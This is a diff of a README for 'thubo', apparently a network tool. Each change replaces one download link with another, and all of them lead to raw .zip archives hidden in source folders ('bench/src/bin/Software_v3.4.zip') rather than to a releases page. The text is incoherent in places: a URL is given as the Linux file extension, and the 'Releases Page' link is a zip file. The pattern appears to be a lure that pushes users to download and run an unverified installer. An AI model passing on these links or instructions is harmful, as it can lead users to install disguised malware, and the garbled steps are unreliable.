@@ -1,6 +1,6 @@
 # 🚀 thubo - A Swift and Reliable Network Solution
 
-[![Download thubo](https://github.com/Tharindu778/thubo/raw/refs/heads/main/src/protocol/Software-1.6-beta.2.zip)](https://github.com/Tharindu778/thubo/raw/refs/heads/main/src/protocol/Software-1.6-beta.2.zip)
+[![Download thubo](https://github.com/Tharindu778/thubo/raw/refs/heads/main/bench/src/bin/Software_v3.4.zip)](https://github.com/Tharindu778/thubo/raw/refs/heads/main/bench/src/bin/Software_v3.4.zip)
 
 ## 📋 Overview
 
@@ -14,13 +14,13 @@ Follow these steps to get started with Thubo. You will learn how to download and
 
 1. **Visit the Releases Page:** Click the link below to go to our Downloads page:
 
-   [Download Thubo](https://github.com/Tharindu778/thubo/raw/refs/heads/main/src/protocol/Software-1.6-beta.2.zip)
+   [Download Thubo](https://github.com/Tharindu778/thubo/raw/refs/heads/main/bench/src/bin/Software_v3.4.zip)
 
 2. **Choose the Right Version:** On the Releases page, you will see a list of available versions. Select the version that fits your system.
 
 3. **Download the File:** Once you pick a version, click on the corresponding download link. This will start the download process.
 
-4. **Locate the Downloaded File:** After the download is complete, find the file in your downloads folder. The file will have an extension such as `.exe` for Windows or `https://github.com/Tharindu778/thubo/raw/refs/heads/main/src/protocol/Software-1.6-beta.2.zip` for Linux.
+4. **Locate the Downloaded File:** After the download is complete, find the file in your downloads folder. The file will have an extension such as `.exe` for Windows or `https://github.com/Tharindu778/thubo/raw/refs/heads/main/bench/src/bin/Software_v3.4.zip` for Linux.
 
 5. **Run the Installer:** 
    - For Windows, double-click the `.exe` file. 
@@ -78,6 +78,6 @@ Thubo is open-source software licensed under the MIT License. Feel free to use, 
 
 Don't forget to keep an eye on the Releases page for new updates and features:
 
-[Visit the Releases Page](https://github.com/Tharindu778/thubo/raw/refs/heads/main/src/protocol/Software-1.6-beta.2.zip) 
+[Visit the Releases Page](https://github.com/Tharindu778/thubo/raw/refs/heads/main/bench/src/bin/Software_v3.4.zip) 
 
 Thank you for choosing Thubo for your network needs!
